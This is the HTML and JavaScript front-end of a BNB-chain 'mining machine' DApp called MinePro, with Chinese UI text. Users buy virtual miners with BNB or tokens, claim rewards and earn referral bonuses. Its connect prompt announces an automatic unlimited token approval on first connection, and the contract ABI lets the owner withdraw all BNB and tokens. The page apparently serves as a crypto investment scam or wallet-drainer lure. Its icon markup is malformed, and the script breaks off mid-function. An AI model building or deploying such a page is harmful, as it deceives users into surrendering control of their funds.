<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MinePro - 高级矿机DAPP</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.8/dist/chart.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    
    <!-- 配置Tailwind -->
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#165DFF',
                        secondary: '#7B61FF',
                        accent: '#00E4FF',
                        dark: '#0F172A',
                        darker: '#0A0F1D',
                        'dark-card': '#1E293B',
                        success: '#00C853',
                        warning: '#FFC107',
                        danger: '#F44336'
                    },
                    fontFamily: {
                        inter: ['Inter', 'system-ui', 'sans-serif'],
                    },
                    animation: {
                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
                        'float': 'float 3s ease-in-out infinite',
                    },
                    keyframes: {
                        float: {
                            '0%, 100%': { transform: 'translateY(0)' },
                            '50%': { transform: 'translateY(-10px)' },
                        }
                    }
                },
            }
        }
    </script>
    
    <style type="text/tailwindcss">
        @layer utilities {
            .content-auto {
                content-visibility: auto;
            }
            .text-gradient {
                background-clip: text;
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            .bg-grid {
                background-image: radial-gradient(rgba(22, 93, 255, 0.1) 1px, transparent 1px);
                background-size: 20px 20px;
            }
            .glass {
                backdrop-filter: blur(10px);
                background-color: rgba(30, 41, 59, 0.6);
            }
            .scrollbar-hide::-webkit-scrollbar {
                display: none;
            }
            .scrollbar-hide {
                -ms-overflow-style: none;
                scrollbar-width: none;
            }
        }
    </style>
</head>
<body class="font-inter bg-dark text-gray-100 min-h-screen overflow-x-hidden bg-grid">
    <!-- 顶部导航栏 -->
    <header class="fixed top-0 left-0 right-0 z-50 glass border-b border-primary/20">
        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
            <div class="flex items-center space-x-2">
                <div class="w-10 h-10 rounded-lg bg-gradient-to-br from-primary to-secondary flex items-center justify-center">
                    <<i class="fa fa-cubes text-xl"></</i>
                </div>
                <h1 class="text-xl font-bold bg-gradient-to-r from-primary to-secondary text-gradient">MinePro</h1>
            </div>
            
            <div class="flex items-center space-x-4">
                <button id="notificationBtn" class="relative p-2 rounded-full hover:bg-white/10 transition-all">
                    <<i class="fa fa-bell-o"></</i>
                    <span class="absolute top-1 right-1 w-2 h-2 bg-accent rounded-full"></span>
                </button>
                <button id="walletBtn" class="flex items-center space-x-2 px-3 py-1.5 rounded-full bg-gradient-to-r from-primary to-secondary hover:opacity-90 transition-all">
                    <<i class="fa fa-wallet"></</i>
                    <span id="walletAddress" class="text-sm font-medium hidden sm:inline">未连接</span>
                </button>
            </div>
        </div>
    </header>

    <!-- 主内容区 -->
    <main class="container mx-auto px-4 pt-20 pb-24">
        <!-- 欢迎/连接提示 -->
        <section id="welcomeSection" class="py-6">
            <div class="text-center mb-6">
                <h2 class="text-[clamp(1.5rem,5vw,2.5rem)] font-bold mb-2">欢迎来到 MinePro</h2>
                <p class="text-gray-400 max-w-md mx-auto">连接您的钱包开始挖矿之旅，获取丰厚奖励</p>
            </div>
            
            <div id="connectionPrompt" class="bg-dark-card rounded-2xl p-6 text-center border border-primary/20 mb-8">
                <div class="w-16 h-16 mx-auto mb-4 bg-primary/10 rounded-full flex items-center justify-center animate-pulse-slow">
                    <<i class="fa fa-link text-primary text-2xl"></</i>
                </div>
                <h3 class="text-xl font-semibold mb-2">连接您的钱包</h3>
                <p class="text-gray-400 mb-6">首次连接将自动授权无限代币额度</p>
                <button id="connectWalletBtn" class="w-full py-3 rounded-xl bg-gradient-to-r from-primary to-secondary font-medium hover:opacity-90 transition-all flex items-center justify-center space-x-2">
                    <<i class="fa fa-plug"></</i>
                    <span>连接钱包</span>
                </button>
            </div>
        </section>
        
        <!-- 资产概览 -->
        <section id="assetsSection" class="mb-8 hidden">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-xl font-bold">资产概览</h2>
                <button class="text-primary text-sm hover:underline">查看详情</button>
            </div>
            
            <div class="grid grid-cols-2 gap-4 mb-6">
                <div class="bg-dark-card rounded-2xl p-5 border border-primary/20">
                    <div class="flex justify-between items-start mb-3">
                        <div>
                            <p class="text-gray-400 text-sm">可用代币</p>
                            <h3 id="availableTokens" class="text-2xl font-bold">0.00</h3>
                        </div>
                        <div class="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center">
                            <<i class="fa fa-token text-primary"></</i>
                        </div>
                    </div>
                    <button class="text-xs text-primary hover:underline">充值</button>
                </div>
                
                <div class="bg-dark-card rounded-2xl p-5 border border-secondary/20">
                    <div class="flex justify-between items-start mb-3">
                        <div>
                            <p class="text-gray-400 text-sm">未领取奖励</p>
                            <h3 id="unclaimedRewards" class="text-2xl font-bold">0.00</h3>
                        </div>
                        <div class="w-10 h-10 rounded-full bg-secondary/10 flex items-center justify-center">
                            <<i class="fa fa-gift text-secondary"></</i>
                        </div>
                    </div>
                    <button id="claimRewardsBtn" class="text-xs text-secondary hover:underline">立即领取</button>
                </div>
            </div>
            
            <div class="bg-dark-card rounded-2xl p-5 border border-primary/20">
                <div class="flex justify-between items-center mb-4">
                    <h3 class="font-semibold">矿机总功率</h3>
                    <span id="totalPower" class="text-primary font-medium">0 GH/s</span>
                </div>
                <div class="w-full bg-gray-700/30 rounded-full h-2.5 mb-2">
                    <div id="powerProgress" class="bg-gradient-to-r from-primary to-secondary h-2.5 rounded-full" style="width: 0%"></div>
                </div>
                <div class="flex justify-between text-xs text-gray-400">
                    <span>当前产能</span>
                    <span id="dailyProduction">0 代币/天</span>
                </div>
            </div>
        </section>
        
        <!-- 矿机购买 -->
        <section id="minersSection" class="mb-8 hidden">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-xl font-bold">矿机商店</h2>
                <button class="text-primary text-sm hover:underline">全部矿机</button>
            </div>
            
            <div class="overflow-x-auto scrollbar-hide pb-4 mb-6">
                <div class="flex space-x-4 min-w-max">
                    <!-- 初始矿机 -->
                    <div class="bg-dark-card rounded-2xl border border-primary/20 w-64 flex-shrink-0 overflow-hidden hover:border-primary transition-all group">
                        <div class="h-32 bg-gradient-to-br from-primary/20 to-primary/5 relative">
                            <img src="https://picsum.photos/id/1/300/200" alt="初始矿机" class="w-full h-full object-cover mix-blend-overlay">
                            <div class="absolute top-3 right-3 bg-primary text-white text-xs px-2 py-1 rounded-full">
                                入门
                            </div>
                        </div>
                        <div class="p-4">
                            <h3 class="font-bold text-lg mb-1">初始矿机</h3>
                            <p class="text-gray-400 text-sm mb-3">适合新手的基础矿机</p>
                            <div class="flex justify-between items-center mb-4">
                                <div>
                                    <p class="text-gray-400 text-xs">功率</p>
                                    <p class="font-medium">10 GH/s</p>
                                </div>
                                <div>
                                    <p class="text-gray-400 text-xs">价格</p>
                                    <p class="font-medium text-primary">0.1 BNB</p>
                                </div>
                            </div>
                            <button id="buyInitialMachineBtn" class="w-full py-2.5 rounded-xl bg-primary/10 text-primary font-medium hover:bg-primary hover:text-white transition-all group-hover:bg-primary group-hover:text-white">
                                购买矿机
                            </button>
                        </div>
                    </div>
                    
                    <!-- 测试矿机 -->
                    <div class="bg-dark-card rounded-2xl border border-secondary/20 w-64 flex-shrink-0 overflow-hidden hover:border-secondary transition-all group">
                        <div class="h-32 bg-gradient-to-br from-secondary/20 to-secondary/5 relative">
                            <img src="https://picsum.photos/id/2/300/200" alt="测试矿机" class="w-full h-full object-cover mix-blend-overlay">
                            <div class="absolute top-3 right-3 bg-secondary text-white text-xs px-2 py-1 rounded-full">
                                测试
                            </div>
                        </div>
                        <div class="p-4">
                            <h3 class="font-bold text-lg mb-1">测试矿机</h3>
                            <p class="text-gray-400 text-sm mb-3">体验用的测试矿机</p>
                            <div class="flex justify-between items-center mb-4">
                                <div>
                                    <p class="text-gray-400 text-xs">功率</p>
                                    <p class="font-medium">5 GH/s</p>
                                </div>
                                <div>
                                    <p class="text-gray-400 text-xs">价格</p>
                                    <p class="font-medium text-secondary">0.05 BNB</p>
                                </div>
                            </div>
                            <button id="buyTestMachineBtn" class="w-full py-2.5 rounded-xl bg-secondary/10 text-secondary font-medium hover:bg-secondary hover:text-white transition-all group-hover:bg-secondary group-hover:text-white">
                                购买矿机
                            </button>
                        </div>
                    </div>
                    
                    <!-- 电力矿机 -->
                    <div class="bg-dark-card rounded-2xl border border-accent/20 w-64 flex-shrink-0 overflow-hidden hover:border-accent transition-all group">
                        <div class="h-32 bg-gradient-to-br from-accent/20 to-accent/5 relative">
                            <img src="https://picsum.photos/id/3/300/200" alt="电力矿机" class="w-full h-full object-cover mix-blend-overlay">
                            <div class="absolute top-3 right-3 bg-accent text-dark text-xs px-2 py-1 rounded-full">
                                高效
                            </div>
                        </div>
                        <div class="p-4">
                            <h3 class="font-bold text-lg mb-1">电力矿机</h3>
                            <p class="text-gray-400 text-sm mb-3">更高效率的专业矿机</p>
                            <div class="flex justify-between items-center mb-4">
                                <div>
                                    <p class="text-gray-400 text-xs">功率</p>
                                    <p class="font-medium">50 GH/s</p>
                                </div>
                                <div>
                                    <p class="text-gray-400 text-xs">价格</p>
                                    <p class="font-medium text-accent">1000 代币</p>
                                </div>
                            </div>
                            <button id="buyPowerMachineBtn" class="w-full py-2.5 rounded-xl bg-accent/10 text-accent font-medium hover:bg-accent hover:text-dark transition-all group-hover:bg-accent group-hover:text-dark">
                                购买矿机
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- 电力矿机选择器 -->
            <div class="bg-dark-card rounded-2xl p-5 border border-accent/20 mb-4">
                <h3 class="font-bold mb-3">电力矿机套餐</h3>
                <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
                    <button class="powerTierBtn p-3 rounded-xl border border-gray-700 hover:border-accent transition-all text-center" data-tier="0">
                        <p class="text-sm font-medium mb-1">T1</p>
                        <p class="text-xs text-gray-400">10 GH/s</p>
                        <p class="text-xs text-accent mt-1">100 代币</p>
                    </button>
                    <button class="powerTierBtn p-3 rounded-xl border border-gray-700 hover:border-accent transition-all text-center" data-tier="1">
                        <p class="text-sm font-medium mb-1">T2</p>
                        <p class="text-xs text-gray-400">50 GH/s</p>
                        <p class="text-xs text-accent mt-1">500 代币</p>
                    </button>
                    <button class="powerTierBtn p-3 rounded-xl border border-gray-700 hover:border-accent transition-all text-center" data-tier="2">
                        <p class="text-sm font-medium mb-1">T3</p>
                        <p class="text-xs text-gray-400">100 GH/s</p>
                        <p class="text-xs text-accent mt-1">1000 代币</p>
                    </button>
                    <button class="powerTierBtn p-3 rounded-xl border border-gray-700 hover:border-accent transition-all text-center" data-tier="3">
                        <p class="text-sm font-medium mb-1">T4</p>
                        <p class="text-xs text-gray-400">500 GH/s</p>
                        <p class="text-xs text-accent mt-1">5000 代币</p>
                    </button>
                </div>
                
                <div class="mt-5 flex items-center justify-between">
                    <div class="flex items-center space-x-3">
                        <button id="decreaseCountBtn" class="w-10 h-10 rounded-full bg-gray-700 flex items-center justify-center">-</button>
                        <span id="machineCount">1</span>
                        <button id="increaseCountBtn" class="w-10 h-10 rounded-full bg-gray-700 flex items-center justify-center">+</button>
                    </div>
                    <button id="confirmPowerMachineBtn" class="py-2.5 px-6 rounded-xl bg-gradient-to-r from-accent to-primary font-medium hover:opacity-90 transition-all">
                        确认购买
                    </button>
                </div>
            </div>
        </section>
        
        <!-- 我的矿机 -->
        <section id="myMinersSection" class="mb-8 hidden">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-xl font-bold">我的矿机</h2>
                <button class="text-primary text-sm hover:underline">管理矿机</button>
            </div>
            
            <div id="noMinersMsg" class="bg-dark-card rounded-2xl p-8 text-center border border-primary/20">
                <div class="w-16 h-16 mx-auto mb-4 bg-primary/10 rounded-full flex items-center justify-center">
                    <<i class="fa fa-cube text-primary text-2xl"></</i>
                </div>
                <h3 class="text-lg font-medium mb-2">您还没有矿机</h3>
                <p class="text-gray-400 mb-6">购买第一台矿机开始您的挖矿之旅</p>
                <button id="goToStoreBtn" class="py-2.5 px-6 rounded-xl bg-gradient-to-r from-primary to-secondary font-medium hover:opacity-90 transition-all">
                    前往商店
                </button>
            </div>
            
            <div id="myMinersList" class="space-y-4 hidden">
                <!-- 矿机项目将通过JS动态添加 -->
            </div>
        </section>
        
        <!-- 推荐奖励 -->
        <section id="referralSection" class="mb-8 hidden">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-xl font-bold">推荐奖励</h2>
                <button class="text-primary text-sm hover:underline">查看记录</button>
            </div>
            
            <div class="bg-dark-card rounded-2xl p-5 border border-primary/20 mb-6">
                <div class="flex flex-col md:flex-row gap-6">
                    <div class="flex-1">
                        <h3 class="font-medium mb-3">您的推荐链接</h3>
                        <div class="flex mb-4">
                            <input type="text" id="referralLink" class="flex-1 bg-gray-800 border border-gray-700 rounded-l-xl px-4 py-2.5 text-sm focus:outline-none focus:border-primary" readonly>
                            <button id="copyReferralBtn" class="bg-primary px-4 rounded-r-xl hover:bg-primary/90 transition-all">
                                <<i class="fa fa-copy"></</i>
                            </button>
                        </div>
                        <p class="text-gray-400 text-sm">邀请好友加入，获得额外奖励</p>
                    </div>
                    <div class="flex-1">
                        <h3 class="font-medium mb-3">推荐二维码</h3>
                        <div class="bg-white p-2 rounded-xl inline-block">
                            <div class="w-32 h-32 bg-gray-100 flex items-center justify-center">
                                <img src="https://picsum.photos/id/20/128/128" alt="推荐二维码" class="w-full h-full object-cover">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="bg-dark-card rounded-2xl p-5 border border-primary/20">
                <h3 class="font-medium mb-4">推荐统计</h3>
                <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
                    <div class="bg-gray-800/50 rounded-xl p-4 text-center">
                        <p class="text-gray-400 text-sm mb-1">推荐人数</p>
                        <p id="referralCount" class="text-2xl font-bold">0</p>
                    </div>
                    <div class="bg-gray-800/50 rounded-xl p-4 text-center">
                        <p class="text-gray-400 text-sm mb-1">总奖励</p>
                        <p id="totalReferralRewards" class="text-2xl font-bold text-primary">0.00</p>
                    </div>
                    <div class="bg-gray-800/50 rounded-xl p-4 text-center">
                        <p class="text-gray-400 text-sm mb-1">今日奖励</p>
                        <p id="todayReferralRewards" class="text-2xl font-bold text-secondary">0.00</p>
                    </div>
                    <div class="bg-gray-800/50 rounded-xl p-4 text-center">
                        <p class="text-gray-400 text-sm mb-1">奖励比例</p>
                        <p id="referralPercentage" class="text-2xl font-bold text-accent">10%</p>
                    </div>
                </div>
                
                <h3 class="font-medium mb-3">推荐记录</h3>
                <div class="space-y-3 max-h-40 overflow-y-auto scrollbar-hide pr-2">
                    <div id="noReferralRecords" class="text-center text-gray-400 py-6">
                        暂无推荐记录
                    </div>
                    <div id="referralRecordsList" class="hidden">
                        <!-- 推荐记录将通过JS动态添加 -->
                    </div>
                </div>
            </div>
        </section>
    </main>
    
    <!-- 底部导航 -->
    <footer class="fixed bottom-0 left-0 right-0 bg-dark-card border-t border-primary/20 z-40">
        <div class="flex justify-around">
            <button class="nav-item flex flex-col items-center justify-center py-3 px-4 text-primary" data-section="assets">
                <<i class="fa fa-dashboard text-xl mb-1"></</i>
                <span class="text-xs">资产</span>
            </button>
            <button class="nav-item flex flex-col items-center justify-center py-3 px-4 text-gray-400" data-section="miners">
                <<i class="fa fa-shopping-cart text-xl mb-1"></</i>
                <span class="text-xs">矿机</span>
            </button>
            <button class="nav-item flex flex-col items-center justify-center py-3 px-4 text-gray-400" data-section="myMiners">
                <<i class="fa fa-cubes text-xl mb-1"></</i>
                <span class="text-xs">我的矿机</span>
            </button>
            <button class="nav-item flex flex-col items-center justify-center py-3 px-4 text-gray-400" data-section="referral">
                <<i class="fa fa-users text-xl mb-1"></</i>
                <span class="text-xs">推荐</span>
            </button>
        </div>
    </footer>
    
    <!-- 加载中弹窗 -->
    <div id="loadingModal" class="fixed inset-0 bg-black/70 flex items-center justify-center z-50 hidden">
        <div class="bg-dark-card rounded-2xl p-6 text-center max-w-xs w-full">
            <div class="w-16 h-16 mx-auto mb-4 border-4 border-primary/30 border-t-primary rounded-full animate-spin"></div>
            <h3 class="font-medium mb-2" id="loadingTitle">处理中</h3>
            <p class="text-gray-400 text-sm" id="loadingMessage">请稍候...</p>
        </div>
    </div>
    
    <!-- 交易确认弹窗 -->
    <div id="confirmModal" class="fixed inset-0 bg-black/70 flex items-center justify-center z-50 hidden">
        <div class="bg-dark-card rounded-2xl p-6 max-w-xs w-full">
            <h3 class="font-bold text-lg mb-2" id="confirmTitle">确认购买</h3>
            <p class="text-gray-400 text-sm mb-6" id="confirmMessage">您确定要购买这台矿机吗？</p>
            <div class="flex space-x-3">
                <button id="cancelConfirmBtn" class="flex-1 py-2.5 rounded-xl bg-gray-800 font-medium hover:bg-gray-700 transition-all">
                    取消
                </button>
                <button id="acceptConfirmBtn" class="flex-1 py-2.5 rounded-xl bg-gradient-to-r from-primary to-secondary font-medium hover:opacity-90 transition-all">
                    确认
                </button>
            </div>
        </div>
    </div>
    
    <!-- 成功提示弹窗 -->
    <div id="successModal" class="fixed inset-0 bg-black/70 flex items-center justify-center z-50 hidden">
        <div class="bg-dark-card rounded-2xl p-6 text-center max-w-xs w-full">
            <div class="w-16 h-16 mx-auto mb-4 bg-success/20 rounded-full flex items-center justify-center">
                <<i class="fa fa-check text-success text-2xl"></</i>
            </div>
            <h3 class="font-bold text-lg mb-2" id="successTitle">操作成功</h3>
            <p class="text-gray-400 text-sm mb-6" id="successMessage">您的交易已成功完成</p>
            <button id="closeSuccessBtn" class="w-full py-2.5 rounded-xl bg-gradient-to-r from-primary to-secondary font-medium hover:opacity-90 transition-all">
                确定
            </button>
        </div>
    </div>
    
    <script>
        // 合约配置
        const CONTRACT_ABI = [{"inputs":[{"internalType":"address","name":"_rewardToken","type":"address"},{"internalType":"address","name":"_treasury","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newAdmin","type":"address"}],"name":"AdminAdded","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"oldAdmin","type":"address"}],"name":"AdminRemoved","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"receiver","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"BNBWithdrawn","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"buyer","type":"address"},{"indexed":false,"internalType":"uint256","name":"price","type":"uint256"}],"name":"InitialMachinePurchased","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"buyer","type":"address"},{"indexed":false,"internalType":"uint256","name":"tierId","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"count","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"totalPrice","type":"uint256"}],"name":"PowerMachinePurchased","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"referrer","type":"address"},{"indexed":true,"internalType":"address","name":"referee","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"ReferralRewardPaid","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"claimer","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"RewardsClaimed","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"buyer","type":"address"},{"indexed":false,"internalType":"uint256","name":"price","type":"uint256"}],"name":"TestMachinePurchased","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"adder","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokensAdded","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"receiver","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokensWithdrawn","type":"event"},{"inputs":[],"name":"BLOCKS_PER_DAY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"INITIAL_MACHINE_PRICE_BNB","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MAX_BUY_COUNT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"REFERRAL_PERCENT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"TEST_MACHINE_PRICE_BNB","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"TREASURY","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"a","type":"address"}],"name":"addAdmin","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"addRewardTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"a","type":"address"}],"name":"addToBlocklist","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"admin","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"baseRewardPerBlockPerPower","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"blocklist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"buyInitialMachine","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tierId","type":"uint256"},{"internalType":"uint256","name":"count","type":"uint256"}],"name":"buyPowerMachine","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"buyTestMachine","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"claimRewards","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"usr","type":"address"}],"name":"dailyRewardOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getGlobalDashboard","outputs":[{"internalType":"uint256","name":"baseReward","type":"uint256"},{"internalType":"uint256","name":"totalMines","type":"uint256"},{"internalType":"uint256","name":"currentBlock","type":"uint256"},{"internalType":"uint256","name":"poolBalance","type":"uint256"},{"internalType":"uint256","name":"networkPower","type":"uint256"},{"internalType":"uint256","name":"dailyProduction","type":"uint256"},{"internalType":"uint256","name":"totalRefRewards","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserDashboard","outputs":[{"internalType":"uint256","name":"normal","type":"uint256"},{"internalType":"uint256","name":"test","type":"uint256"},{"internalType":"uint256[4]","name":"power","type":"uint256[4]"},{"internalType":"uint256","name":"dailyReward","type":"uint256"},{"internalType":"uint256","name":"unclaimed","type":"uint256"},{"internalType":"uint256","name":"totalRefReward","type":"uint256"},{"internalType":"uint256","name":"totalPower","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"machineTiers","outputs":[{"internalType":"uint256","name":"priceToken","type":"uint256"},{"internalType":"uint256","name":"powerMultiplier","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pause","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"referralRecords","outputs":[{"internalType":"address","name":"referrer","type":"address"},{"internalType":"address","name":"referee","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"a","type":"address"}],"name":"removeAdmin","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"a","type":"address"}],"name":"removeFromBlocklist","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"rewardPool","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"rewardToken","outputs":[{"internalType":"contract IERC20","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"referrer","type":"address"}],"name":"setReferrer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"startBlock","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalMachines","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalNetworkPower","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalReferralRewards","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalTokensMinted","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalUsers","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"unpause","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"userInfo","outputs":[{"internalType":"uint256","name":"normalMachineCount","type":"uint256"},{"internalType":"uint256","name":"testMachineCount","type":"uint256"},{"internalType":"uint256","name":"rewardStartBlock","type":"uint256"},{"internalType":"address","name":"referrer","type":"address"},{"internalType":"uint256","name":"referralRewards","type":"uint256"},{"internalType":"bool","name":"hasBoughtInitial","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdrawBNB","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawTokens","outputs":[],"stateMutability":"nonpayable","type":"function"}];
        const CONTRACT_ADDRESS = "0x9dcced4ef738856d2c289d4116cd219c698b22ba";
        const TOKEN_ADDRESS = "0x877f23dcFBa91cadd7d35565Da452c9673C27A33";
        
        // 全局变量
        let web3;
        let minerContract;
        let tokenContract;
        let currentAccount;
        let currentAction = null;
        let selectedTierId = 0;
        let machineCount = 1;
        
        // DOM 元素
        const elements = {
            welcomeSection: document.getElementById('welcomeSection'),
            connectionPrompt: document.getElementById('connectionPrompt'),
            connectWalletBtn: document.getElementById('connectWalletBtn'),
            walletBtn: document.getElementById('walletBtn'),
            walletAddress: document.getElementById('walletAddress'),
            assetsSection: document.getElementById('assetsSection'),
            minersSection: document.getElementById('minersSection'),
            myMinersSection: document.getElementById('myMinersSection'),
            referralSection: document.getElementById('referralSection'),
            loadingModal: document.getElementById('loadingModal'),
            loadingTitle: document.getElementById('loadingTitle'),
            loadingMessage: document.getElementById('loadingMessage'),
            confirmModal: document.getElementById('confirmModal'),
            confirmTitle: document.getElementById('confirmTitle'),
            confirmMessage: document.getElementById('confirmMessage'),
            cancelConfirmBtn: document.getElementById('cancelConfirmBtn'),
            acceptConfirmBtn: document.getElementById('acceptConfirmBtn'),
            successModal: document.getElementById('successModal'),
            successTitle: document.getElementById('successTitle'),
            successMessage: document.getElementById('successMessage'),
            closeSuccessBtn: document.getElementById('closeSuccessBtn'),
            availableTokens: document.getElementById('availableTokens'),
            unclaimedRewards: document.getElementById('unclaimedRewards'),
            claimRewardsBtn: document.getElementById('claimRewardsBtn'),
            totalPower: document.getElementById('totalPower'),
            powerProgress: document.getElementById('powerProgress'),
            dailyProduction: document.getElementById('dailyProduction'),
            buyInitialMachineBtn: document.getElementById('buyInitialMachineBtn'),
            buyTestMachineBtn: document.getElementById('buyTestMachineBtn'),
            buyPowerMachineBtn: document.getElementById('buyPowerMachineBtn'),
            powerTierBtns: document.querySelectorAll('.powerTierBtn'),
            decreaseCountBtn: document.getElementById('decreaseCountBtn'),
            increaseCountBtn: document.getElementById('increaseCountBtn'),
            machineCountEl: document.getElementById('machineCount'),
            confirmPowerMachineBtn: document.getElementById('confirmPowerMachineBtn'),
            noMinersMsg: document.getElementById('noMinersMsg'),
            myMinersList: document.getElementById('myMinersList'),
            goToStoreBtn: document.getElementById('goToStoreBtn'),
            referralLink: document.getElementById('referralLink'),
            copyReferralBtn: document.getElementById('copyReferralBtn'),
            referralCount: document.getElementById('referralCount'),
            totalReferralRewards: document.getElementById('totalReferralRewards'),
            todayReferralRewards: document.getElementById('todayReferralRewards'),
            referralPercentage: document.getElementById('referralPercentage'),
            noReferralRecords: document.getElementById('noReferralRecords'),
            referralRecordsList: document.getElementById('referralRecordsList'),
            navItems: document.querySelectorAll('.nav-item')
        };
        
        // 初始化
        window.addEventListener('load', init);
        
        function init() {
            // 检查钱包是否存在
            if (window.ethereum) {
                setupWalletListeners();
                setupEventListeners();
            } else {
                alert('请使用支持Web3的浏览器或钱包插件');
            }
        }
        
        // 设置钱包事件监听
        function setupWalletListeners() {
            elements.connectWalletBtn.addEventListener('click', connectWallet);
            elements.walletBtn.addEventListener('click', connectWallet);
            
            // 监听账户变化
            window.ethereum.on('accountsChanged', handleAccountsChanged);
            
            // 监听链变化
            window.ethereum.on('chainChanged', () => {
                window.location.reload();
            });
        }
        
        // 设置其他事件监听
        function setupEventListeners() {
            // 导航切换
            elements.navItems.forEach(item => {
